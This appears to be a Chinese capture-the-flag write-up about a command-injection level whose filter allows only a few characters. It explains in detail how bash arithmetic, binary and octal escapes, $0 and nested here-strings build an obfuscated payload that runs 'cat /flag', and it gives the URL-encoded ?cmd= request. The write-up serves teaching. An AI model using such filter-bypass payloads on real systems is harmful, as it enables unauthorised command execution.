  public:: true
  
- 温馨提示
  heading:: true
	- 这关涉及的知识点较多, 写的
	  很长, 中间留了很多错误引导(本人在实验时遇到的问题, 或许你们也会遇
- 源码分析
  heading:: true
	- 跟前几关一样, 更改了 WAF 的过滤字段
	- 这个关卡, 只有`0`, `1`, `'`(单引号), `$`, `<`, `\` , `(` , `)`等可以用
- 解题分析(实验这些命令, 可以先在自己本地的`Bash`试试)
  heading:: true
	- 上一关使用 八进制, 而这一关只有 `0` 和 `1`, 难道使用二进制?
		- 没错
	- 在 `bash` 终端中, 支持使用 `$((2#binary))`来通过二进制表示十进制数
		- 比如
			-
			  ```
			  $((2#10011010)) -> 154
			  ```
	- 虽说知道了 `$((2#binary))` 可以把二进制转为十进制, 但是还是把它拆分开来分析一下
		- 首先是 `$((...))`
			- 在 `bash` 中 `$((...))` 是 **算术扩展（Arithmetic Expansion）** 的语法
			- 比如
				-
				  ```
				  echo $((3 + 5))   # 输出 8
				  echo $((10 / 2))  # 输出 5
				  
				  a=10
				  b=5
				  echo $((a + b))  # 输出 15
				  ```
		- 而 `2#binary` 是 **进制表示法(Base Notation)**, 表示把后面的二进制串, 转化为十进制
			- 同理 `#` 前面的 `2` 也可以是 `8`, `16`, `36`, 如下
			-
			  ```
			  echo $((8#72))  # 输出 58
			  echo $((16#1A))  # 输出 26
			  echo $((36#Z))  # 输出 35
			  ```
	- 熟知 `$((2#binary))` 的原理, 是否会发现, 这里不是有个 `2` 吗, 怎么绕过 WAF 呢
		- 其实只要在嵌套一层 `$((...))` 就可以
		- 可以只使用 `1` 和 `<` 通过左移运算得到 `2`
			- 如 `$((1<<1))`
		- 所以 `$((2#binary))` 可以写为 `$(($((1<<1))#binaryStr))`
	- 然后把 `$(($((1<<1))#binaryStr))` 套入到八进制转义中, 这里拿 `ls` 举例
		- 注意的是, 这里的 `$((2#binary))` 不是直接转为八进制数, 而是转为十进制的数, 而这个十进制数当做八进制使用, 转换步骤详细如下
			-
			  ```
			  ls 转为八进制 -> \154\163
			  使用八进制转义 -> $'\154\163'
			  使用二进制替换 154 和 163, 这两个数现在当做十进制
			  	154 -> $((2#10011010)) -> $(($((1<<1))#10011010))
			      163 -> $((2#10100011)) -> $(($((1<<1))#10100011))
			  于是 $'\154\163' -> $'\$(($((1<<1))#10011010))\$(($((1<<1))#10100011))'
			  ```
	- 但是使用 `$'\$(($((1<<1))#10011010))\$(($((1<<1))#10100011))'` 作为 Payload 时, 似乎并不能执行结果
		- 这里就要先学习一下 `Bash` 的解析这些 **Expansion** 逻辑了
			- [Shell Expansion（Bash 参考手册）](https://www.gnu.org/software/bash/manual/html_node/Shell-Expansions.html)
		- 本文简单就讲解一下, 这里会用到的知识点
		- 首先 `Bash Expansion` 一共有以下几种(执行顺序由上到下)
			- Bash Expansion
			  heading:: true
			  id:: 67d0f279-137a-4e2e-976a-e975e42d0cc9
				- [Brace Expansion(花括号扩展)](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html)
				  collapsed:: true
				- [Tilde Expansion(波浪号扩展)](https://www.gnu.org/software/bash/manual/html_node/Tilde-Expansion.html)
				- [**Shell Parameter Expansion(参数和变量扩展)**](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html)
				- [**Arithmetic Expansion(算术扩展)**](https://www.gnu.org/software/bash/manual/html_node/Arithmetic-Expansion.html)
				- [**Command Substitution(命令替换)**](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html)
				- [Process Substitution(进程替换)](https://www.gnu.org/software/bash/manual/html_node/Process-Substitution.html)
				- [Word Splitting(单词分割)](https://www.gnu.org/software/bash/manual/html_node/Word-Splitting.html)
				- [Filename Expansion(文件名扩展)](https://www.gnu.org/software/bash/manual/html_node/Filename-Expansion.html)
				- [Quote Removal(引用移除)](https://www.gnu.org/software/bash/manual/html_node/Quote-Removal.html)
				  public:: true
  
					- 生成一系列字符串或路径
						- `{a,b,c}` 扩展为 `a`、`b`、`c`
						- `{1..5}` 扩展为 `1 2 3 4 5`
						- `{a..z}` 扩展为从 `a` 到 `z` 的所有字母
					- 还可以组合使用
						- `file_{1..3}.txt` 扩展为 `file_1.txt file_2.txt file_3.txt`
						- `echo {A,B}{1,2}` 会输出 `A1 A2 B1 B2`
		- 而这里会用到的扩展如下
			-
			  ```
			  $(()) -> 算术扩展
			  $'...' -> ANSI C 风格字符串(即允许使用\进行转义)其实也是通过 参数和变量扩展
			  	   -> 命令替换, 即将命令的输出结果再次作为命令
			  ```
		- 而在我们上述命令中, 我们希望**算术扩展**(`$(())`)在**参数和变量扩展**(`$'...'`)之前执行, 但是**参数和变量扩展**会在**算术扩展**之前解析
			- 固然无法正常执行命令
			- 所以这里需要使用 `Here String语法`, 对将命令多次传递给 `bash`, 并通过转义达到对应效果(下文详细讲解)
	- 在讲 `Here String语法` 之前, 先讲一下 bash 中的特殊变量(引用官方的WP)
		-
		  | 变量 | 含义 | 示例输出 |
		  |---|---|---|
		  | `${#}` | 传递给脚本或函数的参数个数 | `0`（参数为空时） |
		  | `${?}` | 上一个命令的退出状态 | `0`（正常退出）或 `1`（异常退出） |
		  | `${_}` | 上一个命令的最后一个参数 | 上一个命令的最后一个参数值 |
		  | `${0}` | 当前脚本或 shell 的名字 | `bash` 或脚本名 |
		  | `${1} 到 ${9}` | 传递给脚本或函数的第 1 到第 9 个参数 | 第 1 到第 9 个参数值 |
		  | `${@}` | 传递给脚本或函数的所有参数（以列表形式） | 所有参数值 |
		  | `${*}` | 传递给脚本或函数的所有参数（以字符串形式） | 所有参数作为单个字符串 |
		  | `${$}` | 当前 shell 的进程 ID (PID) | 进程 ID 值 |
		  | `${!}` | 上一个后台运行的进程的进程 ID (PID) | 后台进程的 PID |
		  | `${-}` | 当前 shell 的选项标志 | `hB`（表示 shell 选项标志） |
		- 而这里需要使用 `$0` 来充当 `bash`, 从而调用 `bash` 命令, 得以绕过WAF
			- 有一点特别注意, 如果你是使用 `SSH` 连接进行尝试使用 `$0` 来实验本文绕过WAF的命令
			- 可能会发现命令在自己的机子上无法识别, 但是在靶机上可以运行
			- 并非 `Bash` 或者系统的问题, 而是连接方式的问题
			- 如果使用登录式Shell (比如SSH连接), $0 输出终端名前会加一个 `-`
				- 可以通过一下命令验证
					-
					  ```
					  echo $0
					  ```
	- `Here String语法`
	  heading:: true
		- Here String 语法
		  heading:: true
		  id:: 6793c81e-fd6e-403b-90ea-dcfbabf2ca20
			- **Here String** 是 Bash 中的一种重定向方式，用于将字符串作为标准输入传递给命令。
			- 它的基本语法是：
				-
				  ```
		  bash
		  - 复制编辑
		  - command <<< "string"
				  ```
			- 等价于：
				-
				  ```
		  bash
		  - 复制编辑
		  - echo "string" | command
				  ```
			- 但 **Here String** 更高效，避免了 `echo` 额外的进程开销。
	- 知道了 `Here String语法` 和 `$0`的用法, 就可以开始调整命令的解析顺序
		- 把前文写出的 Payload 取下来 `$'\$(($((1<<1))#10011010))\$(($((1<<1))#10100011))'`
		- 填上 `Here String语法`, 如下
			-
			  ```
			  $0<<<$'\$(($((1<<1))#10011010))\$(($((1<<1))#10100011))'
			  就在原本的Payload前加上 $0<<< 吗?
			  ```
		- 当然没有这么简单
		- 上文讲到希望**算术扩展**(`$(())`)在**参数和变量扩展**(`$'...'`)之前执行
			- 即`$'\$(($((1<<1))#10011010))\$(($((1<<1))#10100011))'` 中在传递给 `$0`(Bash) 前不会进行解析**参数和变量扩展**(`$'...'`)
			- 所以尝试把 `$'...'` 再传入 `$0` 前, 保持原样
				- 这里想到了把 `'` 进行转义, 即 `$\'...\'`
				-
				  ```
				  # echo $\'\'
				  输出: $''
				  ```
		- 于是Payload有了如下修改 `$0<<<$\'\$(($((1<<1))#10011010))\$(($((1<<1))#10100011))\'`
			- 但是执行后还是有如下报错
				-
				  ```
				  sh: syntax error near unexpected token `('
				  ```
			- 可以尝试在终端中执行如下命令, 观察它们的输出
				-
				  ```
				  echo $((1+1))
				  输出:　2
				  
				  echo \$((1+1))
				  输出: sh: syntax error near unexpected token `('
				  
				  echo (())
				  输出: sh: syntax error near unexpected token `('
				  
				  echo $
				  输出: $
				  
				  echo \$
				  输出: $
				  
				  $
				  输出: sh: $: command not found
				  ```
			- 或许你已经发现问题了
				- `\` 与 `$` 被作为一体了, 即 `$` 不在是一个有特殊作用的字符, 而是被转义为纯字符 `$`, 也就不会作用于后面的 `(())`
				- 而 `(())` 在bash中被检测为语法错误
			- 而为了解决这个问题, 只需要把 `\` 进行转义, 使其成为 `\`字符, 而不是转义符, 即 `\` 替换为 `\\`
		- 最后得到如下 Payload: `$0<<<$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'`
			- ![image.png](../assets/image_1741751982469_0.png)
			- 成功执行
	- 尝试构建获取flag的Payload
		-
		  ```
		  $0<<<$\'\\$(($((1<<1))#10001111))\\$(($((1<<1))#10001101))\\$(($((1<<1))#10100100))\\$(($((1<<1))#101000))\\$(($((1<<1))#111001))\\$(($((1<<1))#10010010))\\$(($((1<<1))#10011010))\\$(($((1<<1))#10001101))\\$(($((1<<1))#10010011))\'
		  ```
		- 运行->报错了?
			- ![image.png](../assets/image_1741756378022_0.png)
		- 是否注意到上文讲的 `Bash Expansion` 有一个 [Word Splitting(单词分割)](https://www.gnu.org/software/bash/manual/html_node/Word-Splitting.html)
			- 他会将命令与参数进行分割, 而上文的命令中, `cat /flag`是转义后得到的, 被 `bash` 当成了一个整体, 所以无法成功执行
		- 为了解决这个问题, 我们只需要把上文的 Payload 在加一层 `Here String语法`
			-
			  ```
			  $0<<<$0\<\<\<\$\'\\$(($((1<<1))#10001111))\\$(($((1<<1))#10001101))\\$(($((1<<1))#10100100))\\$(($((1<<1))#101000))\\$(($((1<<1))#111001))\\$(($((1<<1))#10010010))\\$(($((1<<1))#10011010))\\$(($((1<<1))#10001101))\\$(($((1<<1))#10010011))\'
			  ```
			- 这里同样要注意的是, 为了防止内部的 `Here String语法` 被提前执行, 而不是作为不同字符, 需要使用 `\` 进行转义, 当然 `$'...'` 的 `$` 在这里同理也要转义, 写为 `\$`
	- 到这我们知道了整个绕过WAF的方法了, 可以试试自己手搓其他命令的Payload, 或者自己使用工具吧(同样跟上关的工具是一样的, 这里就不在写出来了)
- 解题步骤
  heading:: true
	- 直接使用工具获取 Payload
		-
		  ```
		  $0<<<$0\<\<\<\$\'\\$(($((1<<1))#10001111))\\$(($((1<<1))#10001101))\\$(($((1<<1))#10100100))\\$(($((1<<1))#101000))\\$(($((1<<1))#111001))\\$(($((1<<1))#10010010))\\$(($((1<<1))#10011010))\\$(($((1<<1))#10001101))\\$(($((1<<1))#10010011))\'
		  ```
		- ![image.png](../assets/image_1741756834698_0.png){:height 422, :width 718}
	- 直接把 Payload 复制到浏然器中进行 GET 请求, 尽然没有出 flag?
		- 这是因为 `#` 在URL中是特殊字符, 如果要把 `#` 通过 GET 请求传输, 需要进行URL编码
		- 即 `#` -> `%23`
	- 所以 Payload 如下
		-
		  ```
		  ?cmd=$0<<<$0\<\<\<\$\'\\$(($((1<<1))%2310001111))\\$(($((1<<1))%2310001101))\\$(($((1<<1))%2310100100))\\$(($((1<<1))%23101000))\\$(($((1<<1))%23111001))\\$(($((1<<1))%2310010010))\\$(($((1<<1))%2310011010))\\$(($((1<<1))%2310001101))\\$(($((1<<1))%2310010011))\'
		  ```
	- ![image.png](../assets/image_1741760352214_0.png)
